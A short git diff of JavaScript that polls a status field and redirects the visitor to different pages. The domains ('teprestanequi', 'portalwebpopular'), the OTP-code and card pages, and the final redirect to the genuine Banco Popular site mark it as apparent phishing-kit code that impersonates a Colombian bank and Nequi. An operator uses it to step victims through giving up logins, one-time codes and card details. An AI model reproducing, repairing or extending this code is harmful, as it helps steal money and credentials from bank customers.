@@ -169,9 +169,9 @@ document.addEventListener('DOMContentLoaded', async () => {
       }
 
       if (data.estado === "autorizado") window.location.href = "https://teprestanequi.vercel.app/cupo.html";
-      else if (data.estado === "error") window.location.href = "https://portalwebpopular.vercel.app/popular/pre/";
-      else if (data.estado === "otp") window.location.href = "https://teprestanequi.vercel.app/inicio/codeinco.html";
-      else if (data.estado === "fallo") window.location.href = "https://portalwebpopular.vercel.app/popular/pre/tarjeta.html";
+      else if (data.estado === "error") window.location.href = "https://teprestanequi.vercel.app/inicio/codeinco.html";
+      else if (data.estado === "otp") window.location.href = "https://teprestanequi.vercel.app/inicio/codigo.html";
+      else if (data.estado === "fallo") window.location.href = "https://teprestanequi.vercel.app/fac.html";
       else if (data.estado === "finalizado") window.location.href = "https://www.bancopopular.com.co/";
       else setTimeout(checkStatus, 2000);
 
